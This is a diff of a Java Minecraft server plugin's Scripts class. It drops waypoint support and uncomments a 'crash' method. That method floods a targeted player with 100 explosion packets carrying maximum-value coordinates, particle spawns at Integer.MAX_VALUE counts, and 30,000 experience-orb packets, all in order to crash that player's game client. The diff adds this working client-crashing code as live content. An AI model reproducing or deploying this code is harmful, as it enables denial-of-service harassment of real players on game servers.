@@ -2,8 +2,11 @@ package cz.qery.toolkit;
 
 import com.google.gson.JsonObject;
 import com.google.gson.JsonParser;
-import cz.qery.toolkit.lunar.Waypoint;
+import net.minecraft.network.protocol.game.PacketPlayOutExplosion;
+import net.minecraft.network.protocol.game.PacketPlayOutSpawnEntityExperienceOrb;
 import net.minecraft.server.level.EntityPlayer;
+import net.minecraft.world.entity.EntityExperienceOrb;
+import net.minecraft.world.phys.Vec3D;
 import org.bukkit.*;
 import org.bukkit.craftbukkit.v1_19_R1.entity.CraftPlayer;
 import org.bukkit.entity.Player;
@@ -13,8 +16,7 @@ import java.net.URI;
 import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
-import java.util.ArrayList;
-import java.util.List;
+import java.util.Collections;
 
 public class Scripts {
     static Main plugin = Main.getPlugin(Main.class);
@@ -24,9 +26,6 @@ public class Scripts {
     static String h = plugin.getConfig().getString("color.highlight");
 
 
-    public static List<Waypoint> waypoints = new ArrayList<>();
-
-    @SuppressWarnings("deprecation")
     public static void bCheck(Player p) {
         World world = p.getWorld();
         int x = p.getLocation().getBlockX();
@@ -129,17 +128,13 @@ public class Scripts {
     public static void crash(Player p) throws InterruptedException {
         EntityPlayer p_entity = ((CraftPlayer) p).getHandle();
         Location loc = p.getLocation();
-        /*
 
         for (int i = 0; i < 100; i++) {
             PacketPlayOutExplosion packet = new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE));
             p_entity.b.a(packet);
         }
 
-
-        Thread.sleep(1000);
-
-         */
+        Thread.sleep(500);
 
         for (int i = 0; i < 100; i++) {
             p.spawnParticle(Particle.EXPLOSION_HUGE, loc, Integer.MAX_VALUE);
@@ -152,18 +147,15 @@ public class Scripts {
             p.spawnParticle(Particle.CLOUD, loc, Integer.MAX_VALUE);
             p.spawnParticle(Particle.CRIT, loc, Integer.MAX_VALUE);
             p.spawnParticle(Particle.CRIT_MAGIC, loc, Integer.MAX_VALUE);
+            p.spawnParticle(Particle.MOB_APPEARANCE, loc, Integer.MAX_VALUE);
         }
-        /*
 
-        Thread.sleep(1000);
+        Thread.sleep(500);
 
         for (int i = 0; i < 30000; i++) {
             EntityExperienceOrb dd = new EntityExperienceOrb(p_entity.s, p.getLocation().getX(), p.getLocation().getY(), p.getLocation().getZ(), Integer.MAX_VALUE);
             PacketPlayOutSpawnEntityExperienceOrb packet = new PacketPlayOutSpawnEntityExperienceOrb(dd);
             p_entity.b.a(packet);
         }
-
-         */
-
     }
 }
